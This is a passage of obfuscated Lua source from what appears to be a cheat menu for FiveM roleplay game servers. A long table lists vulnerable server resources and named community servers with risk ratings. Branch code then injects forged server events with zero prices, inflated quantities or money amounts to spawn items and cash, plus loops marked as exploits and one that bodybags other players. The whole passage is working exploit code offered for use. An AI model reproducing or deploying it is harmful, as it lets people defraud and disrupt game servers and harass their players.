Risk)",type="money",res={"qb-warehouse"},all=false},{id="rm_camperv",name="Any Item Trigger (Medium Risk)",type="item",res={"rm_camperv"},all=false},{id="ry_rent",name="Money Trigger (Medium Risk)",type="money",res={"ry_rent"},all=false},{id="savana_trucker",name="Money Trigger (Medium Risk)",type="money",res={"savana-truckerjob"},all=false},{id="sayer_jukebox",name="Any Item Trigger (Medium Risk)",type="item",res={"sayer-jukebox"},all=false},{id="sell_usb",name="Any Event Trigger (Medium Risk)",type="event",res={"sell_usb"},all=false},{id="snipe_boombox",name="Any Item Trigger (Medium Risk)",type="item",res={"snipe-boombox"},all=false},{id="solos_cashier",name="Money Trigger (Medium Risk)",type="money",res={"solos-cashier"},all=false},{id="solos_food",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-food"},all=false},{id="solos_hookah",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-hookah"},all=false},{id="solos_jointroll",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-jointroll"},all=false},{id="solos_joints",name="Any Item Trigger (High Risk)",type="item",res={"solos-joints"},all=false},{id="solos_methlab",name="Any Item Trigger (High Risk)",type="item",res={"solos-methlab"},all=false},{id="solos_moneywash",name="Any Item Trigger (High Risk)",type="item",res={"solos-moneywash"},all=false},{id="solos_restaurants",name="Any Item Trigger (Medium Risk)",type="item",res={"solos-restaurants"},all=false},{id="t1ger_gangsystem",name="Any Item Trigger (High Risk)",type="item",res={"t1ger_gangsystem"},all=false},{id="t1ger_lib",name="Any Item Trigger (Medium Risk)",type="item",res={"t1ger_lib"},all=false},{id="xmmx_letscookplus",name="Any Item Trigger (Medium Risk)",type="item",res={"xmmx_letscookplus"},all=false},{id="zat_farming",name="Any Item Trigger (Medium Risk)",type="item",res={"zat-farming"},all=false},{id="zat_weed",name="Any Item Trigger (High Risk)",type="item",res={"zat-weed"},all=false},{id="fromthebottom_la",name="~g~[FromTheBottom LA] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="central_valley_v3",name="~g~[Central Valley V3] Jim Consumables",res={"jim-consumables"},type="item",risk="safe",all=true},{id="da_ghetto_la_rp",name="~g~[Da Ghetto LA RP] IT-Lib",res={"it-lib"},type="item",risk="safe",all=true},{id="mafia_land_rp",name="~y~[Mafia Land RP] DevCore SmokeV2 (1x)",res={"devcore_smokev2"},type="item",risk="medium",all=true},{id="land_of_hustlers_rp",name="~y~[Land Of Hustlers RP] DevCore Needs (1x)",res={"devcore_needs"},type="item",risk="medium",all=true},{id="gangsters_paradice",name="~g~[Gangsters Paradice] R Scripts Tuning",res={"r_scripts-tuningV2"},type="item",risk="safe",all=true},{id="thegardens_chicago",name="~r~[TheGardens Chicago] Jail Work Money",res={"esx-qalle-jail"},type="event",risk="high",all=true},{id="cold_hearted_nyc",name="~g~[Cold Hearted NYC] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="revenge_serious_rp",name="~g~[Revenge Serious RP] Jim Consumables",res={"jim-consumables"},type="item",risk="safe",all=true},{id="straight_out_the_gutta_srp",name="~g~[Straight Out Gutta] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="get_wild_chiraq_rp",name="~g~[Get Wild Chiraq] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="ghost_city_roleplay",name="~y~[Ghost City] Apex Cluckinbell (1x)",res={"apex_cluckinbell"},type="item",risk="medium",all=true},{id="truevision_roleplay",name="~g~[TrueVision RP] TVRP Drugs",res={"tvrpdrugs"},type="item",risk="safe",all=true},{id="tales_from_the_hood_rp",name="~g~[Tales From Hood] NK BBQ + Pug",res={"nk-barbeque","Pug"},type="item",risk="safe",all=false},{id="the_strip_rp",name="~g~[The Strip RP] Matti Airsoft",res={"matti-airsoft"},type="item",risk="safe",all=true},{id="murdaville_rp",name="~r~[MurdaVille RP] Starter Pack Money",res={"apx_starterpack"},type="event",risk="high",all=true},{id="the_flats_roleplay",name="~g~[The Flats] QB Drugs + Jim Mining",res={"qb-advancedrugs","jim-mining"},type="item",risk="safe",all=false},{id="la_chronicles_roleplay",name="~g~[LA Chronicles] Horizon + Solos + WP",res={"horizon_paymentsystem","solos-joints","wp-pocketbikes"},type="item",risk="safe",all=false},{id="toe_tag_world_rp",name="~g~[Toe Tag World] Boii + Jim Mining",res={"boii-moneylaunderer","boii-consumables","jim-mining"},type="item",risk="safe",all=false},{id="federal_nightmares_nyc",name="~g~[Federal Nightmares] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="cfw_x3f6_s8",name="~g~[CFW X3F6] Jim Recycle",res={"jim-recycle"},type="item",risk="safe",all=true},{id="white_chalk_rp",name="~g~[White Chalk RP] AngelicXS Jobs",res={"angelicxs-CivilianJobs"},type="item",risk="safe",all=true},{id="hustla_roleplay_v2",name="~g~[Hustla V2] XMMX + HG Wheel",res={"xmmx_letscookplus","hg-wheel"},type="item",risk="safe",all=false},{id="motor_city_roleplay",name="~g~[Motor City] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="chicago_heights_rp",name="~g~[Chicago Heights] Weedroll + XMMX",res={"weedroll","xmmx_letscookplus"},type="item",risk="safe",all=false},{id="the_box_rp",name="~g~[The Box RP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="feed_tha_family_v2",name="~g~[Feed Tha Family V2] XMMX",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="newenergyrp",name="~g~[NewEnergyRP] Jim Mining",res={"jim-mining"},type="item",risk="safe",all=true},{id="frontstreet_rp",name="~y~[FrontStreet RP] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="ontheflo",name="~g~[OnTheFlo] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="unphazed_roleplay",name="~g~[UNPHAZED] Jim Mining",res={"jim-mining"},type="item",risk="safe",all=true},{id="that_70s_roleplay",name="~g~[That 70s] Jim Mechanic",res={"jim-mechanic"},type="item",risk="safe",all=true},{id="sob_rp",name="~g~[SOB RP] HG Wheel",res={"hg-wheel"},type="item",risk="safe",all=true},{id="ybn_chiraq_rp",name="~g~[YBN Chiraq] AngelicXS",res={"angelicxs-CivilianJobs"},type="item",risk="safe",all=true},{id="chiraq_city",name="~y~[Chiraq City] DevCore Needs (1x)",res={"devcore_needs"},type="item",risk="medium",all=true},{id="bayshore_heights",name="~y~[Bayshore Heights] T1GER Lib (1x)",res={"t1ger_lib"},type="item",risk="medium",all=true},{id="rewind_rp",name="~g~[REWIND RP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="crimeinthed_serious_rp",name="~g~[CrimeInTheD] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="lakeshore_rp",name="~g~[Lakeshore RP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="the_corner_nyc",name="~g~[The Corner NYC] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="big_yard_rp",name="~g~[Big Yard RP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="streets_callin_rp",name="~g~[Streets Callin] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="streetz_of_the_chi",name="~g~[Streetz Of Chi] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="tb2la_rp",name="~g~[TB2LA RP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="new_pape_rp_v4",name="~g~[New Pape V4] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="chicago_vendetta_rp",name="~g~[Chicago Vendetta] AK47 DrugManager",res={"ak47_drugmanager"},type="item",risk="safe",all=true},{id="last_stop",name="~g~[LAST STOP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="metro_heights_roleplay",name="~g~[Metro Heights] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="dirty_money",name="~g~[Dirty Money] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="fazoland_chiraq",name="~g~[Fazoland Chiraq] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="all_the_smoke_rp_v2",name="~g~[All The Smoke V2] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="get_wild_chiraq_rp_c5",name="~g~[Get Wild C5] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="no_attempt",name="~g~[No Attempt] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="its_only_money_rp",name="~g~[Its Only Money] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="gritty_nyc",name="~g~[GRITTY NYC] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="tri_state_rp",name="~g~[Tri-State RP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="the_gates_rp",name="~g~[The Gates RP] AK47 + AngelicXS",res={"ak47_drugmanager","angelicxs-CivilianJobs"},type="item",risk="safe",all=false},{id="tnn_rp",name="~g~[TNN RP] Jim Consumables",res={"jim-consumables"},type="item",risk="safe",all=true},{id="unity_rp",name="~g~[Unity RP] Jim Consumables + Pug",res={"jim-consumables","Pug"},type="item",risk="safe",all=false},{id="stellarxx",name="~y~[StellarXx] Zat Farming (1x)",res={"zat-farming"},type="item",risk="medium",all=true},{id="paradise_roleplay",name="~g~[Paradise RP] AngelicXS + XMMX",res={"angelicxs-CivilianJobs","xmmx_letscookplus"},type="item",risk="safe",all=false},{id="elite_rp_4_0",name="~g~[Elite RP 4.0] Kaves DrugsV2",res={"kaves_drugsv2"},type="item",risk="safe",all=true},{id="the_city_wl",name="~g~[The City WL] Kaves DrugsV2",res={"kaves_drugsv2"},type="item",risk="safe",all=true},{id="dreamzzz_rp",name="~g~[DreamZzZ RP] Kaves + XMMX",res={"kaves_drugsv2","xmmx_letscookplus"},type="item",risk="safe",all=false},{id="project_haven",name="~g~[Project Haven] AngelicXS",res={"angelicxs-CivilianJobs"},type="item",risk="safe",all=true},{id="phoenix_rp",name="~g~[Phoenix RP] AngelicXS",res={"angelicxs-CivilianJobs"},type="item",risk="safe",all=true},{id="smoke_valley_rp_v2",name="~g~[Smoke Valley V2] AngelicXS",res={"angelicxs-CivilianJobs"},type="item",risk="safe",all=true},{id="strike_city_detroit",name="~g~[Strike City Detroit] AngelicXS + T1GER",res={"angelicxs-CivilianJobs","t1ger_lib"},type="item",risk="safe",all=false},{id="moonlight_roleplay",name="~g~[Moonlight RP] AngelicXS",res={"angelicxs-CivilianJobs"},type="item",risk="safe",all=true},{id="mafia_family_rp",name="~g~[Mafia Family RP] AngelicXS",res={"angelicxs-CivilianJobs"},type="item",risk="safe",all=true},{id="evarose_v2",name="~g~[EvaRose V2] Jim Consumables",res={"jim-consumables"},type="item",risk="safe",all=true},{id="evergreen_rp",name="~g~[Evergreen RP] Jim Burgershot",res={"jim-burgershot"},type="item",risk="safe",all=true},{id="freestyle_rp",name="~g~[Freestyle RP] Jim Consumables",res={"jim-consumables"},type="item",risk="safe",all=true},{id="morpheusrp",name="~g~[MorpheusRP] MT Restaurants",res={"mt-restaurants"},type="item",risk="safe",all=true},{id="cloud_9_roleplay",name="~g~[Cloud 9] Jim Recycle",res={"jim-recycle"},type="item",risk="safe",all=true},{id="creation_roleplay_v2",name="~g~[Creation V2] Jim Recycle",res={"jim-recycle"},type="item",risk="safe",all=true},{id="greenleaf_roleplay",name="~g~[Greenleaf] Jim Recycle",res={"jim-recycle"},type="item",risk="safe",all=true},{id="project_genesis_2_0",name="~g~[Project Genesis 2.0] Jim Recycle",res={"jim-recycle"},type="item",risk="safe",all=true},{id="the_vault_rp",name="~g~[The Vault RP] Jim Recycle",res={"jim-recycle"},type="item",risk="safe",all=true},{id="hazy_days_rp",name="~g~[Hazy Days RP] Jim Recycle",res={"jim-recycle"},type="item",risk="safe",all=true},{id="oakwood_hills",name="~g~[Oakwood Hills] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="playita_roleplay",name="~g~[Playita] QB Drugs",res={"qb-drugs"},type="item",risk="safe",all=true},{id="whip_city_rp",name="~g~[Whip City RP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="marble_rock",name="~g~[Marble Rock] Pug + T1GER",res={"Pug","t1ger_lib"},type="item",risk="safe",all=false},{id="iron_haven_roleplay",name="~g~[Iron Haven] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="gr8_rp_reloaded",name="~g~[Gr8 RP Reloaded] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="untamed_serenity_rp",name="~g~[Untamed Serenity] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="los_santos_by_night",name="~g~[Los Santos By Night] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="high_times_roleplay",name="~g~[High Times] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="city_of_dallas_rp",name="~g~[City of Dallas] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="bigcityrp",name="~g~[BigCityRP] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="mercy_rp",name="~g~[Mercy RP] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="banana_gaming_v2",name="~g~[Banana Gaming V2] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="lifeline_rp_2_0",name="~g~[Lifeline RP 2.0] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="illusions_rp",name="~g~[Illusions RP] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="incity_rp_2_0",name="~g~[InCity RP 2.0] Pug Chopping",res={"Pug"},type="item",risk="safe",all=true},{id="newworld_rp",name="~g~[NewWorld RP] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="designer_gas_club",name="~g~[Designer Gas Club] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="dirty_south_roleplay",name="~g~[Dirty South] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="cartel_dreams",name="~g~[Cartel Dreams] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="unwritten_rp",name="~g~[Unwritten RP] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="los_angeles_dojrp",name="~g~[LA DOJRP] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="loverloser_slime_city_rp",name="~g~[LoverLoser Slime] T1GER + XMMX",res={"t1ger_lib","xmmx_letscookplus"},type="item",risk="safe",all=false},{id="rising_dawn_roleplay_2_0",name="~g~[Rising Dawn 2.0] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="northern_rp",name="~g~[Northern RP] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="colorado_state_roleplay",name="~g~[Colorado State] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="hustlaz_paradise",name="~g~[Hustlaz Paradise] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="wicked_rp",name="~g~[Wicked RP] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="san_andreas_valley_rp",name="~g~[San Andreas Valley] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="ignite_roleplay",name="~g~[Ignite RP] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="rich_as_in_spirit",name="~g~[Rich As In Spirit] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="fukdewya_rp",name="~g~[FukdewyaRP] T1GER + XMMX",res={"t1ger_lib","xmmx_letscookplus"},type="item",risk="safe",all=false},{id="lite_pixel_v2",name="~g~[Lite Pixel V2] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="parkside_la",name="~g~[ParkSide LA] T1GER Lib",res={"t1ger_lib"},type="item",risk="safe",all=true},{id="dominican_city_rp",name="~g~[DominicanCityRP] Horizon Payment",res={"horizon_paymentsystem"},type="item",risk="safe",all=true},{id="livev_roleplay",name="~g~[LiveV RP] Horizon Payment",res={"horizon_paymentsystem"},type="item",risk="safe",all=true},{id="locked_in",name="~g~[Locked In] Solos Joints",res={"solos-joints"},type="item",risk="safe",all=true},{id="evolve_legacy_rp",name="~g~[Evolve Legacy] Solos Joints",res={"solos-joints"},type="item",risk="safe",all=true},{id="hoopers_wl_s2",name="~g~[Hoopers WL S2] Solos Joints",res={"solos-joints"},type="item",risk="safe",all=true},{id="project_9",name="~g~[Project 9] Solos Joints",res={"solos-joints"},type="item",risk="safe",all=true},{id="like_a_boss_rp",name="~g~[Like A Boss] Solos + Jim Recycle",res={"solos-joints","jim-recycle"},type="item",risk="safe",all=false},{id="risky_rp",name="~g~[Risky RP] Jim Recycle + Solos",res={"jim-recycle","solos-joints"},type="item",risk="safe",all=false},{id="moonlit_hills_rp",name="~g~[Moonlit Hills] Solos + Jim Recycle",res={"solos-joints","jim-recycle"},type="item",risk="safe",all=false},{id="project_baby_v3",name="~g~[Project Baby V3] XMMX + AK47 ID",res={"xmmx_letscookplus","ak47_idcard"},type="item",risk="safe",all=false},{id="first_48_rp",name="~g~[First 48 RP] XMMX + AK47 ID",res={"xmmx_letscookplus","ak47_idcard"},type="item",risk="safe",all=false},{id="wicked_nyc",name="~y~[Wicked NYC] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="back4blood",name="~y~[Back4Blood] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="strikelyfe_wl",name="~y~[StrikeLyfe WL] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="florida_water",name="~y~[Florida Water] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="california_breeze_rp_v2",name="~g~[California Breeze V2] XMMX + AK47 ID",res={"xmmx_letscookplus","ak47_idcard"},type="item",risk="safe",all=false},{id="nomind_rp",name="~g~[NoMind RP] XMMX + AK47 ID",res={"xmmx_letscookplus","ak47_idcard"},type="item",risk="safe",all=false},{id="cuh_city_rp_v2",name="~y~[Cuh City V2] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="streets_of_houston",name="~g~[Streets Of Houston] XMMX + AK47 ID",res={"xmmx_letscookplus","ak47_idcard"},type="item",risk="safe",all=false},{id="it_gets_real_rp",name="~y~[It Gets Real] AK47 ID + DevCore (1x)",res={"ak47_idcard","devcore_smokev2"},type="item",risk="medium",all=false},{id="paid_in_full_chicago",name="~y~[Paid In Full] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="land_of_opportunity",name="~y~[Land Of Opportunity] AK47 + Smoke (1x)",res={"ak47_idcard","devcore_smokev2"},type="item",risk="medium",all=false},{id="run_it_back_rp",name="~g~[Run It Back] AK47 + DevCore Smoke",res={"ak47_idcard","devcore_smokev2"},type="item",risk="safe",all=false},{id="grimy_chicago",name="~y~[Grimy Chicago] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="junglesrp_v3",name="~y~[JunglesRP V3] AK47 ID Card (1x)",res={"ak47_idcard"},type="item",risk="medium",all=true},{id="fastlanerp",name="~g~[FastlaneRP] AK47 + DevCore Smoke",res={"ak47_idcard","devcore_smokev2"},type="item",risk="safe",all=false},{id="sfrp",name="~g~[SFRP] XMMX Letscook+",res={"xmmx_letscookplus"},type="item",risk="safe",all=true},{id="district_of_miami_s2",name="~g~[District Of Miami S2] XMMX + Smoke",res={"xmmx_letscookplus","devcore_smokev2"},type="item",risk="safe",all=false},{id="fastmoney_rp_v2",name="~g~[FastMoney V2] XMMX + Jim Mining",res={"xmmx_letscookplus","jim-mining"},type="item",risk="safe",all=false},{id="mt_restaurants",name="~g~[MT Restaurants] AddItem",res={"mt-restaurants"},type="item",risk="safe",all=true},{id="boii_whitewidow",name="~g~[Boii Whitewidow] AddItem",res={"boii-whitewidow"},type="item",risk="safe",all=true},{id="hg_wheel",name="~y~[HG Wheel] GiveItem (1x)",res={"hg-wheel"},type="item",risk="medium",all=true},{id="uwucafe",name="~g~[UwuCafe] AddItem",res={"uwucafe"},type="item",risk="safe",all=true},{id="matti_airsoft",name="~g~[Matti Airsoft] GiveItem",res={"matti-airsoft"},type="item",risk="safe",all=true},{id="wp_pocketbikes",name="~y~[WP Pocketbikes] AddItem (1x)",res={"wp-pocketbikes"},type="item",risk="medium",all=true},{id="drug_sell_exploit",name="~r~[EXPLOIT] Drug Sell Loop (Infinite $)",res={"stasiek_selldrugsv2"},type="event",risk="high",all=true},{id="recycle_money_exploit",name="~r~[EXPLOIT] Recycle Money (100k)",res={"recycle"},type="event",risk="high",all=true},{id="playtime_exploit",name="~r~[EXPLOIT] Playtime Boost (24h)",res={"th_playtime","DE_playtime"},type="event",risk="high",all=true},{id="bodybag_exploit",name="~r~[EXPLOIT] Bodybag Player",res={"RRP_BODYBAG"},type="event",risk="high",all=true}};local v252=false;for v270,v271 in ipairs(v251) do local v272=false;if v271.all then local v315=0 -0 ;while true do if ((354 -(5 + 349))==v315) then v272=true;for v417,v418 in ipairs(v271.res) do if  not v47(v418) then v272=false;break;end end break;end end else for v343,v344 in ipairs(v271.res) do if v47(v344) then v272=true;break;end end end if v272 then local v316=v248;local v317=v250;if ((v271.type=="money") or (v271.type=="event")) then v316="money";end if (v271.id=="ak_item") then for v400=v72.akIndex,( #v271.res + v72.akIndex) -(4 -3)  do local v401=((v400-1)% #v271.res) + (1272 -(266 + 1005)) ;local v402=v271.res[v401];if v47(v402) then v72.akIndex=(v401% #v271.res) + 1 + 0 ;local v427,v428,v429=table.unpack(GetEntityCoords(PlayerPedId()));local v430=([[Citizen.CreateThread(function() pcall(function() TriggerServerEvent(%q,%q,{['phone']=0},%d,0) end); DoScreenFadeOut(1);Citizen.Wait(1000);SetEntityCoordsNoOffset(PlayerPedId(),%f,%f,%f,false,false,false);Citizen.Wait(1000);DoScreenFadeIn(1000) end)]]):format(v402   .. ":process" ,v316,v317,v427,v428,v429);v73(v430);v252=true;break;end end elseif (v271.id=="nails_money") then v73(('pcall(function() TriggerServerEvent("delivery:giveRewardnails",%d) end)'):format(v317));v252=true;elseif (v271.id=="handbag_money") then local v435=0 -0 ;while true do if (v435==(0 -0)) then v73(('pcall(function() TriggerServerEvent("delivery:giveRewardhandbags",%d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="sneaker_money") then v73(('pcall(function() TriggerServerEvent("delivery:giveRewardShoes",%d) end)'):format(v317));v252=true;elseif (v271.id=="caps_money") then local v458=1696 -(561 + 1135) ;while true do if (0==v458) then v73(('pcall(function() TriggerServerEvent("delivery:giveRewardCaps",%d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="generic_money") then v73(("pcall(function() TriggerServerEvent('ak47_qb_drugmanagerv2:shop:buy', '53.15-1478.79', {['buyprice']=0, ['currency']='cash', ['name']='%s', ['sellprice']=0, ['label']='Katana MeNu On Top!!'}, %d) end)"):format(v316,v317));v252=true;elseif (v271.id=="hotdog_money") then local v465=0;while true do if (v465==(0 -0)) then v73(("pcall(function() local ped=GetPlayerPed(-1) local pedCoords=GetEntityCoords(ped) local HotdogsForSale=1 local SellingPrice=%d TriggerServerEvent('qb-hotdogjob:server:Sell', pedCoords, HotdogsForSale, SellingPrice) end)"):format(v317));v252=true;break;end end elseif (v271.id=="ak47_inventory") then local v466=0 -0 ;while true do if ((1066 -(507 + 559))==v466) then v73(([[TriggerServerEvent('ak47_inventory:buyItemDrag',{fromInv={identifier=nil,slot=1,slotData={amount=%d,close=true,count=999999999999999,description="CodePlug Found Ts Lol",info={account="cash",buyPrice=0},label="CodePlug Too Good Lol",name="%s",quality=100,slot=1,type="item",weight=0}},toInv={identifier=nil,slot=1,slotData={slot=1}}} )]]):format(v317,v316));v252=true;break;end end elseif (v271.id=="shop_purchase") then local v467="codeplug"   .. math.random(2509 -1509 ,99999) ;v73(('pcall(function() TriggerServerEvent("shop:purchaseItem2", "%s", "%s", 0) end)'):format(v467,v316));v252=true;elseif (v271.id=="cl_pizzeria") then local v468=0 -0 ;while true do if (0==v468) then v73(('pcall(function() TriggerServerEvent("CL-Pizzeria:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="solstice_moonshine") then local v469=388 -(212 + 176) ;while true do if ((905 -(250 + 655))==v469) then v73(('pcall(function() TriggerServerEvent("SolsticeMoonshineV2:server:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="tk_smokev2") then local v470=0;while true do if (v470==0) then v73(('pcall(function() TriggerServerEvent("Tk_smokev2:server:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ox_cb_ws_sellshop") then local v471=0 -0 ;while true do if (v471==0) then v73(('pcall(function() TriggerServerEvent("__ox_cb_ws_sellshop:sellItem", "sellshop", "ws_sellshop:sellItem:17692", { currency = "money", item = "%s", price = 9999999999, quantity = %d }) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="adminplus_selldrugs") then local v472=0;while true do if (v472==(0 -0)) then v73(('pcall(function() TriggerEvent("stasiek_selldrugsv2:findClient",{ ["i"] = 8, ["label"] = "CodePlugFuckedUrCity", ["type"] = "CodePlugFuckedUrCity", ["zone"] = "The Meat Quarter", ["price"] = %d, ["count"] = 0 }) end)'):format(v317));v252=true;break;end end elseif (v271.id=="ak47_drugmanager") then local v473=0 -0 ;while true do if ((1956 -(1869 + 87))==v473) then v73(('pcall(function() TriggerServerEvent("ak47_drugmanager:pickedupitem","%s","%s",%d) end)'):format(v316,v316,v317));v252=true;break;end end elseif (v271.id=="ak47_drugmanagerv2") then local v474=0 -0 ;while true do if (v474==0) then v73(('pcall(function() TriggerServerEvent("ak47_drugmanagerv2:shop:buy", "-1146.444941.22", { buyprice = 0, currency = "money", label = "codeplug", name = "%s", sellprice = 69696969 }, %d ) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ak47_prospecting_reward") then local v475=0;while true do if (v475==(1901 -(484 + 1417))) then v73(('pcall(function() TriggerServerEvent("ak47_prospecting:reward", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="ak47_prospecting_sell") then local v476=0 -0 ;while true do if (v476==(0 -0)) then v73(('pcall(function() TriggerServerEvent("ak47_prospecting:sell","cash",%d,9999999999) end)'):format(v317));v252=true;break;end end elseif (v271.id=="ak4y_fishing") then local v477=773 -(48 + 725) ;while true do if (v477==(0 -0)) then v73(('pcall(function() TriggerServerEvent("ak4y-advancedFishing:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ak4y_case_opening") then local v478=0 -0 ;while true do if (v478==0) then v73(('pcall(function() TriggerServerEvent("ak4y-caseOpening:addGoldCoin", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="ak4y_playtime_shop") then local v479=0 + 0 ;while true do if (v479==(0 -0)) then v73(('pcall(function() TriggerServerEvent("ak4y-playTimeShop:addCoin", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="angelicxs_civilian_payment") then local v480=0 + 0 ;while true do if (v480==0) then v73(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:Payment", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="angelicxs_civilian_item") then local v481=0 + 0 ;while true do if (v481==0) then v73(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="apex_cluckinbell") then local v482=0;while true do if (v482==(853 -(152 + 701))) then v73(('pcall(function() TriggerServerEvent("apex_cluckinbell:client:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="apex_rexdiner") then local v483=1311 -(430 + 881) ;while true do if (0==v483) then v73(('pcall(function() TriggerServerEvent("apex_rexdiner:client:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ars_hunting") then local v484=0 + 0 ;while true do if (v484==(895 -(557 + 338))) then v73(('pcall(function() TriggerServerEvent("ars_hunting:sellBuyItem", { item = "%s", price = 1, quantity = %d, buy = true }) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ars_vvsgrillz") then local v485=0;while true do if (v485==0) then v73(('pcall(function() TriggerServerEvent("ars_vvsgrillz_v2:Buyitem", "grillz", { items = {{ id = "%s", quantity = %d, price = 0, stock = 999999, totalPrice = 0 }}, method = "bank", total = 0 }, "bank") end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ars_vvsguns") then v73(('pcall(function() TriggerServerEvent("ars_vvsguns:Buyitem", "vvsguns", { items = { { id = "%s", image = "codeplug", name = "codeplug", page = 2, price = 0, quantity = %d, stock = 9999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v316,v317));v252=true;elseif (v271.id=="ars_vvsjewelry") then local v486=0 + 0 ;while true do if (v486==(0 -0)) then v73(('pcall(function() TriggerServerEvent("ars_vvsjewelry:Buyitem", "vvsjewelry", { items = { { id = "%s", image = "CodePlug", name = "CodePlugRunsUrCity", page = 2, price = 0, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash" ) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ars_whitewidow") then v73(('pcall(function() 